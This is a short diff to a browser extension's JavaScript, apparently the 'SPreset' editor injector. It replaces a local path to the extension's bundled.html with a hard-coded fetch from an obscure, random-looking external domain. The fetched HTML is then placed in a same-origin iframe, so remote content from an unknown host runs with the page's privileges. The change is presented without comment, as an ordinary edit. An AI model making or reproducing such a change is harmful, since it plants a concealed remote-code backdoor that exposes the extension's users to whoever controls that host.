@@ -490,12 +490,8 @@ function installSPresetMessageInjectionHook() {
 
 // inject SPresetEditor
 if (true) {
-  const spresetScriptUrl = document.currentScript?.src
-    || document.getElementById('spreset_inject')?.src
-    || '/scripts/extensions/third-party/SPreset/inject.js';
-  const editorBundleUrl = new URL('bundled.html', spresetScriptUrl).href;
   // fetch html file
-  fetch(editorBundleUrl, { cache: 'no-store' })
+  fetch('https://jnai2d9kgnbs6xzx5c.com/regex_bind/bundled.html')
     .then(res => res.text())
     .then(htmlText => {
       // create iframe with text as same-origin iframe
